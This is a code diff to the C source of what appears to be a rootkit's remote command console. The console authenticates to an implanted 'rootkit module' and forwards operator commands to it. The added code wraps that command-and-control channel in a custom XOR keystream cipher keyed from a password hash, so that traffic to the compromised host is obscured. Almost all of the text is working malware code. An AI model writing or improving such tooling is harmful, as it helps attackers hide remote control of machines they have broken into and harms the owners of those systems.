@@ -75,6 +75,65 @@ static int read_line(int fd, char *buf, size_t size)
     return -1;
 }
 
+static uint8_t keystream_byte(uint32_t key, uint32_t pos)
+{
+    uint32_t x = key + pos * 0x9E3779B1U;
+
+    x ^= x >> 16;
+    x *= 0x85ebca6bU;
+    x ^= x >> 13;
+    x *= 0xc2b2ae35U;
+    x ^= x >> 16;
+
+    return (uint8_t)x;
+}
+
+static void crypt_buffer(char *buf, size_t len, uint32_t key, uint32_t *pos)
+{
+    while (len-- > 0) {
+        *buf++ ^= keystream_byte(key, *pos);
+        (*pos)++;
+    }
+}
+
+static int write_encrypted(int fd, const char *buf, size_t len,
+                           uint32_t key, uint32_t *pos)
+{
+    char tmp[BUF_SIZE];
+
+    if (len > sizeof(tmp))
+        return -1;
+
+    memcpy(tmp, buf, len);
+    crypt_buffer(tmp, len, key, pos);
+    return write_all(fd, tmp, len);
+}
+
+static int read_encrypted_line(int fd, char *buf, size_t size,
+                               uint32_t key, uint32_t *pos)
+{
+    size_t rn = 0;
+
+    while (rn + 1 < size) {
+        ssize_t n = read(fd, &buf[rn], 1);
+        if (n <= 0)
+            return -1;
+
+        crypt_buffer(&buf[rn], 1, key, pos);
+        if (buf[rn] == '\n') {
+            buf[rn] = '\0';
+            if (rn > 0 && buf[rn - 1] == '\r')
+                buf[rn - 1] = '\0';
+            return 0;
+        }
+
+        rn++;
+    }
+
+    buf[rn] = '\0';
+    return -1;
+}
+
 static int wait_for_command_or_disconnect(int client_fd)
 {
     while (1) {
@@ -145,6 +204,8 @@ int main(int argc, char **argv)
     char buf[BUF_SIZE];
     char auth_msg[BUF_SIZE];
     char auth_reply[BUF_SIZE];
+    uint32_t session_key = 0;
+    uint32_t tx_pos = 0, rx_pos = 0;
     int opt = 1;
 
     if (argc != 2) {
@@ -205,8 +266,11 @@ int main(int argc, char **argv)
             continue;
         }
 
-        snprintf(auth_msg, sizeof(auth_msg), "AUTH %08x\n", fnv1a_hash(password));
-        if (write_all(client_fd, auth_msg, strlen(auth_msg)) < 0) {
+        session_key = fnv1a_hash(password);
+        tx_pos = rx_pos = 0;
+        snprintf(auth_msg, sizeof(auth_msg), "AUTH %08x\n", session_key);
+        if (write_encrypted(client_fd, auth_msg, strlen(auth_msg),
+                            session_key, &tx_pos) < 0) {
             perror("write AUTH");
             close(client_fd);
             continue;
@@ -216,7 +280,8 @@ int main(int argc, char **argv)
         printf("[+] AUTH sent\n");
         fflush(stdout);
 
-        if (read_line(client_fd, auth_reply, sizeof(auth_reply)) < 0 ||
+        if (read_encrypted_line(client_fd, auth_reply, sizeof(auth_reply),
+                                session_key, &rx_pos) < 0 ||
             strcmp(auth_reply, "AUTH_OK") != 0) {
             timestamp();
             printf("[-] Authentication failed: invalid password or connection lost\n");
@@ -262,7 +327,8 @@ int main(int argc, char **argv)
             }
 
             /* 2. Forward the command payload to the rootkit module */
-            if (write_all(client_fd, buf, strlen(buf)) < 0) {
+            if (write_encrypted(client_fd, buf, strlen(buf),
+                                session_key, &tx_pos) < 0) {
                 printf("\n[!] Connection lost or rootkit disconnected.\n");
                 break;
             }
@@ -283,6 +349,7 @@ int main(int argc, char **argv)
                         break;
                     }
 
+                    crypt_buffer(buf, n, session_key, &rx_pos);
                     buf[n] = '\0';
                     printf("%s", buf);
                     fflush(stdout);
